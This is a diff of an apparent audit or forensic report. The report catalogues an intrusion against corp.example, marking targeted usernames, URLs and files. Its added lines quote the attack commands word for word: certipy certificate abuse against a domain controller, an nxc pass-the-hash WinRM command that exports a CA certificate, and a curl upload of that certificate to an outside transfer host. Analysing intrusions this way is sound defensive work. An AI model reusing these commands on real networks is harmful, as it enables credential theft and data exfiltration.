@@ -112,7 +112,7 @@ Notable files   (a finding of high severity)
   [x] script  20250301_104500_step07_exfil.sh
       found   FileUpload, CertificateExport, nxc (CredentialAccess)
 
-Targeted   (hardcoded in a script; prior: no earlier output holds it; discovered: an earlier output does)
+Targeted   (hardcoded values: prior means no earlier output holds it, discovered means one does; subjects: each entity an activity acted on)
   Usernames (4)
     [!] MSOL_0a1b2c3d4e5f@corp.example  prior       20250301_103200_step05_certs.sh:5, 20250301_103200_step05_certs.sh:6
         what  certipy find -u "$MSOL_USER@corp.example" -p "$MSOL_PASS" -dc-ip 10.20.1.5 -vulnerable -stdout | tee 20250301_103240_certipy_find.txt (20250301_103200_step05_certs.sh:5)
@@ -163,6 +163,14 @@ Targeted   (hardcoded in a script; prior: no earlier output holds it; discovered
         what  DC_IP=10.20.1.5 (20250301_101800_step02_enum.sh:2)
               certipy find -u "$MSOL_USER@corp.example" -p "$MSOL_PASS" -dc-ip 10.20.1.5 -vulnerable -stdout | tee 20250301_103240_certipy_find.txt (20250301_103200_step05_certs.sh:5)
               certipy auth -pfx "$PFX" -dc-ip 10.20.1.5 -username administrator -domain corp.example > 20250301_104010_step06_auth.txt (20250301_104000_step06_auth.sh:3)
+  Url (1)
+    [x] https://transfer.example.net/upload  FileUpload
+        what  FileUpload: curl -s -T 20250301_104100_ca_backup.p12 https://transfer.example.net/upload (20250301_104500_step07_exfil.sh:4)
+  File (2)
+    [x] 20250301_104100_ca_backup.p12  FileUpload
+        what  FileUpload: curl -s -T 20250301_104100_ca_backup.p12 https://transfer.example.net/upload (20250301_104500_step07_exfil.sh:4)
+    [x] ca_backup.p12                  CertificateExport
+        what  CertificateExport: nxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x "certutil -exportPFX -p Ex*****! (8 chars) My $CA_THUMB ca_backup.p12" (20250301_104500_step07_exfil.sh:3)
 
 Exposure   (collected: first seen in an output; used: first seen in a script; a secret is masked)
   Passwords and secrets (7)
